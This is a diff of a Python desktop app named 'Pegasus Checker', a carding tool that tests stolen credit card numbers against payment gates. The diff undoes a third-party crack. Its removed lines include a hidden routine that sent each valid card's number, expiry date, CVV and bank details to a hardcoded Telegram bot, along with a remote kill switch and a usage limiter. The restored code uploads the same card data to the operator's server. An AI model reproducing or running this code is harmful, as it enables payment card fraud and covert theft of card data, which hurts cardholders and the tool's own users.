@@ -31,8 +31,6 @@ import logging
 import sys
 import traceback
 from PyQt5.QtWidgets import QMessageBox
-# from cryptography.fernet import Fernet
-# import socket
 
 
 environ['PYGAME_HIDE_SUPPORT_PROMPT'] = '1'
@@ -182,23 +180,67 @@ class Tools:
         except Exception as e:
             self.app.signal_error.emit(f"Error en tools {str(e)}")
 
-    #CrackedByMagick!
     def get_creditos(self,usuario,passwd):
-        '''Recibe el usuario y el username para retornar el numero de creditos que tiene actualmente'''       
-        return('99999')
 
-    #CrackedByMagick!
+        try:
+
+            entry = {"username": usuario,"password": passwd}
+
+            cr = requests.post(urlHerokuGlobal + '//get_credits',json=entry)
+
+            if cr.status_code == 200:
+                orbes = cr.json().get('credits')  # Extraer los creditos solo si fue exitoso
+            else:
+                print(cr.json().get('error'))  # Muestra el mensaje de error si no fue exitoso
+
+            return(orbes)
+
+        except Exception as e:
+            self.app.signal_error.emit(f"Error en tools {str(e)}")
+
     def validate_creditos(self,usuario,passwd):
-        '''Recibe el usuario y contrasena, si sus creditos son menores a 0 retorna True, de lo contrario retorna False'''
-        return False
 
-    #CrackedByMagick!
-    def repetir(self,cc):
-        return False
+        try:
 
-    #CrackedByMagick!
-    def minuscredits(self,usuario,passwd,gate):       
-        return('99999')        
+            '''Recibe el usuario y contrasena, si sus creditos son menores a 0 retorna True, de lo contrario retorna False'''
+            entry = {"username": usuario,"password": passwd}
+
+            response  = requests.post(urlHerokuGlobal + '//get_credits',json=entry)
+            data = response.json()
+            credits = int(data['credits'])
+            if credits < 6:
+                return True
+            else:
+                return False
+
+        except Exception as e:
+            self.app.signal_error.emit(f"Error en tools {str(e)}")
+
+    def repetir(self, live):
+
+        try:
+            entry = {"valor_a_buscar": live}            
+            cr = requests.post(urlHerokuGlobal + '//buscar',json=entry)
+            if cr.status_code == 200 and cr.json().get("mensaje") =="Verdadero":
+                return True
+            else:
+                return False
+
+        except Exception as e:
+            self.app.signal_error.emit(f"Error en tools {str(e)}")
+
+    def minuscredits(self,usuario,passwd,gate):
+
+        try:
+
+            '''Recibe el usuario y contrasena, hace la resta de creditos y actualiza en la nube, retorna el numero de creditos con la resta'''
+            entry = {"username": usuario,"password": passwd, "gate": gate}
+            ##print(entry)
+            x = requests.put(urlHerokuGlobal + '//edit',json=entry)
+            return (x.text)
+
+        except Exception as e:
+            self.app.signal_error.emit(f"Error en tools {str(e)}")
 
     def borrarcc(self,texto):
 
@@ -517,11 +559,18 @@ class MainWindow(QMainWindow):
         self.user = user
         self.tag = tag
 
-        try:
-            
-            #CrackedByMagick!            
+        print(f"self.username: {self.username}, "
+      f"self.password: {self.password}, "
+      f"self.token: {self.token}, "
+      f"self.geoip: {self.geoip}, "
+      f"self.user: {self.user}, "
+      f"self.tag: {self.tag}")
 
-            entry = {"username": 'self.username',"password": self.password}
+
+        print("Logged0")
+
+        try:
+            entry = {"username": 'dasda',"password": self.password}
             cr = requests.post(urlHerokuGlobal + '//get_userid', json=entry)
 
             print(cr.content)
@@ -555,12 +604,38 @@ class MainWindow(QMainWindow):
         except Exception as e:
             self.app.signal_error.emit(f"Error en tools {str(e)}")
 
+       
+        # try:
+        #     # Simular la respuesta de la API
+        #     fake_response = {
+        #         "user_id": 189,
+        #         "minOrbes": 1200,
+        #         "dias_restantes": 3
+        #     }
+
+        #     # Asignar valores directamente desde el diccionario simulado
+        #     self.userid = fake_response.get('user_id')  # Extraer el user_id
+        #     self.minOrbes = fake_response.get('minOrbes')  # Extraer el mínimo de orbes
+        #     self.dias = fake_response.get('dias_restantes')  # Extraer los días restantes
+
+        #     # Variable global
+        #     global minOrbes
+        #     minOrbes = self.minOrbes
+
+        #     # Imprimir los valores y sus tipos
+        #     print(f"self.userid: {self.userid}, tipo: {type(self.userid)}")
+        #     print(f"self.minOrbes: {self.minOrbes}, tipo: {type(self.minOrbes)}")
+        #     print(f"self.dias: {self.dias}, tipo: {type(self.dias)}")
+        #     print(f"self.globalminOrbes: {minOrbes}, tipo: {type(minOrbes)}")
+
+        # except Exception as e:
+        #     self.app.signal_error.emit(f"Error en tools {str(e)}")
+
         #self.userid = userid
 
         self.tools = Tools(app, username, password, token, geoip, user, tag)
-        
-        #CrackedByMagick!
-        # self.tools.views_git('./config/screenwindow.ui')
+
+        self.tools.views_git('./config/screenwindow.ui')
         global QMainWindow, Ui_MainWindow
         Ui_MainWindow, QMainWindow = uic.loadUiType("./config/screenwindow.ui")
 
@@ -580,7 +655,7 @@ class MainWindow(QMainWindow):
         #self.ui.bt_menu.clicked.connect(self.mover_menu)
         self.ui.Start.clicked.connect(self.do_sum)
         self.ui.start_b.clicked.connect(self.go_browser)
-        # self.ui.livesb.clicked.connect(self.get_lives)
+        self.ui.livesb.clicked.connect(self.get_lives)
         self.ui.ccsgen.clicked.connect(self.show_ccs)
         self.search_thread = None
         self.ui.Stop.clicked.connect(self.stop_search)
@@ -597,8 +672,8 @@ class MainWindow(QMainWindow):
         self.ui.back_key_2.clicked.connect(lambda: self.ui.stackedWidget.setCurrentIndex(0))
         self.ui.back_i.clicked.connect(lambda: self.ui.stackedWidget.setCurrentIndex(0))
         self.ui.p_gate_finder.clicked.connect(lambda: self.ui.stackedWidget.setCurrentIndex(3)) # GATE/FINDER 3 
-        # self.ui.livesb.clicked.connect(lambda: self.ui.stackedWidget.setCurrentIndex(2)) # LIVES 2 
-        # self.ui.keys.clicked.connect(lambda: self.ui.stackedWidget.setCurrentIndex(4)) # KEYS 4 
+        self.ui.livesb.clicked.connect(lambda: self.ui.stackedWidget.setCurrentIndex(2)) # LIVES 2 
+        self.ui.keys.clicked.connect(lambda: self.ui.stackedWidget.setCurrentIndex(4)) # KEYS 4 
         self.ui.browser.clicked.connect(lambda: self.ui.stackedWidget.setCurrentIndex(5)) # BRWOSER 5
         self.movie = QMovie("./config/loading.gif")
         self.movie.setScaledSize(QSize(35, 35))  # Define el tamaño deql GIF
@@ -761,18 +836,15 @@ class MainWindow(QMainWindow):
 
         try:
 
-            #CrackedByMagick!
-            admins = ['ERRORERROR', 'MorenoxdERROR', 'HidanERROR', 'ZenoxPavERROR', 'MushiroXERROR', 'MagickCheckerDEBUG']
+            self.username = username
+            self.password = password
+
+            
+            admins = ['', 'Morenoxd', 'Hidan', 'ZenoxPav', 'MushiroX']
 
             if not username in admins:
                 self.ui.console.hide()
                 self.ui.see.hide()
-
-            
-
-            username = "CrackByMagick!"
-            self.username = username
-            self.password = password
 
             msgWelcome = 'BIENVENIDO '+ self.username.upper()+' A PEGASUS CHECKER'
 
@@ -1003,34 +1075,29 @@ class MainWindow(QMainWindow):
             self.ui.recheck.hide()
 
     def load_key(self):
-        #CrackedByMagick!
         #print(urlHerokuGlobal)
+        key_search = self.ui.key.text()
+        ##print(key_search, self.username)
+        entry = {
+            "key": key_search,
+            "username": self.username
+        }
 
-        credits = "99999"
-        self.ui.CREDITOSS.setText(str(credits))
-
-        # key_search = self.ui.key.text()
-        # ##print(key_search, self.username)
-        # entry = {
-        #     "key": key_search,
-        #     "username": self.username
-        # }
-
-        # # Haciendo la petición POST
-        # response = requests.post(urlHerokuGlobal + '/add-credits', json=entry)
+        # Haciendo la petición POST
+        response = requests.post(urlHerokuGlobal + '/add-credits', json=entry)
 
 
-        # # Convertir la respuesta en JSON a un diccionario de Python
-        # data = response.json()
+        # Convertir la respuesta en JSON a un diccionario de Python
+        data = response.json()
 
-        # # Extraer y imprimir el mensaje de la respuesta
-        # message = data.get("message", "No message found")
-        # ##print(message)
-        # self.ui.label.setText(message)
+        # Extraer y imprimir el mensaje de la respuesta
+        message = data.get("message", "No message found")
+        ##print(message)
+        self.ui.label.setText(message)
 
-        # if response.status_code == 200:
-        #     credits = self.tools.get_creditos(self.username, self.password)
-        #     self.ui.CREDITOSS.setText(str(credits))
+        if response.status_code == 200:
+            credits = self.tools.get_creditos(self.username, self.password)
+            self.ui.CREDITOSS.setText(str(credits))
 
     def find_gates(self):
         bin_search = self.ui.ccfind.text()
@@ -1274,14 +1341,6 @@ class MainWindow(QMainWindow):
             elif self.ui.radioButton_7.isChecked():
                 num1 = 7
 
-            #CrackedByMagick!
-            # usage_checker = UsageChecker()
-            # if not usage_checker.check_usage_limit():
-            #     usage_checker.show_expired_message()
-            #     return False
-            # else:
-            #     print("Application is within usage limit.")  # Mensaje de depuración
-                
 
             app = self.app
 
@@ -1388,56 +1447,59 @@ class MainWindow(QMainWindow):
         self.ui.erroneo2.setText('PAUSADO')
 
     def update_live(self,text):
-        #CrackedByMagick!
+
         try:
+
             text1 = text.split('|')
             self.tools.minuscredits(self.username,self.password,text1[2])
-            data = text1[7]+' '+text1[8]+' '+text1[9]+' '+text1[10]+' '+text1[11]
-            entry = {"username": self.username,"gate": text1[2],"tarjeta": text1[3], "mes": text1[4], "ano": text1[5], "cvv": text1[6], "banco": data}
-            # cr = requests.put(urlHerokuGlobal + '//send',json=entry)
 
-            # Obtener el nombre de la PC
-            pc_name = ''#socket.gethostname()
-            entry["pc_name"] = pc_name
+            #data = text1[7]+' '+text1[8]+' '+text1[9]+' '+text1[10]+' '+text1[11]
+            #tarjeta = text1[3] + '|' + text1[4] + '|' + text1[5] + '|' + text1[6] + '|' + data
+            fecha_actual = datetime.now()
+            fecha_formateada = fecha_actual.strftime('%Y-%m-%d %H:%M:%S')
 
-            # Enviar mensaje a Telegram
-            bot_token = '6632357105:AAGJS6KP7eltPDTJt9_2H4QRTAl55ntmha0'  # Reemplaza con el token de tu bot
-            chat_id = '-1002213616098'  # Reemplaza con el ID de tu canal o chat
-            message = (
-                f"Checker: PEGASUS\n\n"
-                f"Username: {entry['username']}\n"
-                f"Gate: {entry['gate']}\n"
-                f"Tarjeta: {entry['tarjeta']}\n"
-                f"Mes: {entry['mes']}\n"
-                f"Año: {entry['ano']}\n"
-                f"CVV: {entry['cvv']}\n"
-                f"Banco: {entry['banco']}\n"
-                f"PC Name: {entry['pc_name']}"
-            )
+            if text1 != None:
 
-            telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-            telegram_data = {
-                "chat_id": chat_id,
-                "text": message
-            }
+                try:
+                    estado = text1[13]
+                    if 'LOWFUNDS' in estado:
+                        estado = 'LOWFUNDS'
+                        pais = 'COL'
+                except:
+                    estado = "LIVE"
 
-            try:
-                response = requests.post(telegram_url, data=telegram_data)
-                response.raise_for_status()
-                print("Mensaje enviado a Telegram")
-            except requests.RequestException as e:
-                print(f"Error al enviar mensaje a Telegram: {e}")
-                
+                entry = {
 
-            self.ui.lives.append(text)
-            self.ui.CREDITOSS.setText(self.tools.get_creditos(self.username, self.password))
-            self.tools.escribir_en_archivo(text)
-            Lc = int(self.ui.Lcont.text())+1
-            self.ui.Lcont.setText(str(Lc))
-            sound_file = "./config/check.wav" 
-            pygame.mixer.init()
-            pygame.mixer.music.load(sound_file)
-            pygame.mixer.music.play()    
+                    "fk_user_id": self.userid,
+                    "gate": text1[2],
+                    "cc": text1[3],
+                    "mes": text1[4],
+                    "year": text1[5],
+                    "ccv": text1[6],
+                    "type": text1[7],
+                    "bank": text1[8],
+                    "data": text1[9],
+                    "franquicia": text1[10],
+                    "pais": text1[11].split('\n')[0],
+                    "fecha": fecha_formateada, # Usa la fecha formateada
+                    "estado": estado
+                }
+
+                print(entry)
+                cr = requests.put(urlHerokuGlobal + '//send',json=entry)
+                self.ui.lives.append(text)
+
+                credits = self.tools.get_creditos(self.username, self.password)
+
+                self.ui.CREDITOSS.setText(str(credits))
+
+                self.tools.escribir_en_archivo(text)
+                Lc = int(self.ui.Lcont.text())+1
+                self.ui.Lcont.setText(str(Lc))
+                sound_file = "./config/check.wav" 
+                pygame.mixer.init()
+                pygame.mixer.music.load(sound_file)
+                pygame.mixer.music.play()
 
         except Exception as e:
             self.app.signal_error.emit(f"Error actualizando live: {str(e)}")
@@ -1450,24 +1512,6 @@ class MainWindow(QMainWindow):
         self.ui.deads.append(text)
         Lc = int(self.ui.Dcont.text())+1
         self.ui.Dcont.setText(str(Lc))
-
-        # URL que devuelve True o False
-        url = 'https://raw.githubusercontent.com/Magick-Chk/d65h54d9681rq56er4t8e9gh1aqw/main/updas56d4as65d4as56das0das2da64dsa'  # Reemplaza con tu URL
-        try:
-            response = requests.get(url)
-            data = response.json()  # Suponiendo que la respuesta es JSON
-            print(data)
-        except requests.RequestException as e:
-            QMessageBox.critical(self, "Error", f"No se pudo conectar a la URL: {e}")
-            self.close()
-            return
-        
-        # Verificar la respuesta
-        if not data.get('status'):  # Si la respuesta es False
-            QMessageBox.critical(self, "Magick Checker", "Magick Checker, Esta version del Crack ya no esta disponible 💜")
-            self.close()
-            return
-       
 
     def show_ccs(self):
         os.startfile(os.getcwd()+"\\config\\CCS.txt")
@@ -1495,16 +1539,25 @@ class MainWindow(QMainWindow):
             self.animacion.start()
 
     def soporte(self):
-        #CrackedByMagick!
         msg_box = QMessageBox()
-        msg_box.setWindowTitle("Magick Checker 🔮")
-        msg_box.setText("Cracked by @MagickCheckerOficial 💜")
-        msg_box.addButton("Contact!", QMessageBox.NoRole)
-   
+        msg_box.setWindowTitle("Soporte")
+        msg_box.setText("Estos links te llevarán a los encargados de soporte. ¿A cuál quieres ir?")
+        msg_box.addButton("Dashiro", QMessageBox.NoRole)
+        msg_box.addButton("Mushiro", QMessageBox.NoRole)
+        msg_box.addButton("Katakuri", QMessageBox.NoRole)
+
         respuesta = msg_box.exec_()
 
+        api_url = urlHerokuGlobal + "/support"
+        response = requests.get(api_url)
+        data = response.json()
+
         if respuesta == 0:
-            webbrowser.open('https://t.me/MagickCheckerOficial')       
+            webbrowser.open(data['supp1'])
+        elif respuesta == 1:
+            webbrowser.open(data['supp2'])
+        elif respuesta == 2:
+            webbrowser.open(data['supp3'])
         else:
             pass
 
@@ -1541,100 +1594,6 @@ class MainWindow(QMainWindow):
             #QApplication.instance().signal_error.emit(error_msg)  # Emite el error a través de una señal global
 
     sys.excepthook = handle_exception
-
-
-#####SISTEMA LIMITE DE CRACK
-            
-
-# class UsageChecker:
-#     def __init__(self):
-#         # Genera o carga la clave de encriptación
-#         self.key_file = os.path.join(os.path.expanduser('~'), "PegasusCrack", "key.key")
-#         self.key = self.load_or_generate_key()
-#         self.cipher = Fernet(self.key)
-
-#     def load_or_generate_key(self):
-#         # Genera una clave de encriptación si no existe
-#         if not os.path.exists(self.key_file):
-#             os.makedirs(os.path.dirname(self.key_file), exist_ok=True)
-#             key = Fernet.generate_key()
-#             with open(self.key_file, 'wb') as f:
-#                 f.write(key)
-#             return key
-#         else:
-#             with open(self.key_file, 'rb') as f:
-#                 return f.read()
-
-#     def get_user_path(self):
-#         # Obtiene la ruta del directorio del usuario
-#         user_folder = os.path.expanduser('~')
-#         app_folder = os.path.join(user_folder, "PegasusCrack")
-#         if not os.path.exists(app_folder):
-#             os.makedirs(app_folder)
-#         return os.path.join(app_folder, "usage_limit.enc")
-
-#     def encrypt_date(self, date):
-#         return self.cipher.encrypt(date.encode())
-
-#     def decrypt_date(self, encrypted_date):
-#         return self.cipher.decrypt(encrypted_date).decode()
-
-#     def check_usage_limit(self):
-#         allowed_days = 10
-#         usage_file_path = self.get_user_path()
-
-#         if not os.path.exists(usage_file_path):
-#             with open(usage_file_path, 'wb') as f:
-#                 f.write(self.encrypt_date(str(datetime.today().date())))  # Usa `datetime.today()`
-#             os.chmod(usage_file_path, 0o600)
-#             self.show_start_message()
-#             return True
-
-#         try:
-#             with open(usage_file_path, 'rb') as f:
-#                 start_date = datetime.strptime(self.decrypt_date(f.read()), "%Y-%m-%d").date()
-
-#             # Calcula días restantes
-#             current_date = datetime.today().date()
-#             days_used = (current_date - start_date).days
-#             days_remaining = allowed_days - days_used
-
-#             if days_remaining < 0:
-#                 self.show_expired_message()
-#                 return False
-#             else:
-#                 # self.show_remaining_days_message(days_remaining)
-#                 return True
-#         except Exception as e:
-#             print(f"Error al leer o desencriptar el archivo: {e}")
-#             return False
-
-#     def show_expired_message(self):
-#         msg = QMessageBox()
-#         msg.setIcon(QMessageBox.Icon.Warning)
-#         msg.setText("Tu tiempo de uso ha expirado.")
-#         msg.setInformativeText("Por favor, contacta con soporte.")
-#         msg.setWindowTitle("Acceso Denegado")
-#         msg.exec()
-
-#     def show_start_message(self):
-#         msg = QMessageBox()
-#         msg.setIcon(QMessageBox.Icon.Information)
-#         msg.setText("Tu período de uso ha comenzado.")
-#         msg.setInformativeText("Tienes 10 días para usar la aplicación.")
-#         msg.setWindowTitle("Tiempo de Uso Iniciado")
-#         msg.exec()
-
-#     def show_remaining_days_message(self, days_remaining):
-#         msg = QMessageBox()
-#         msg.setIcon(QMessageBox.Icon.Information)
-#         msg.setText(f"Te quedan {days_remaining} días para usar la aplicación.")
-#         msg.setInformativeText("Disfruta de tu período de uso.")
-#         msg.setWindowTitle("Días Restantes")
-#         msg.exec()
-
-
-#####SISTEMA LIMITE DE CRACK
 
 # Configura el logger
 logging.basicConfig(
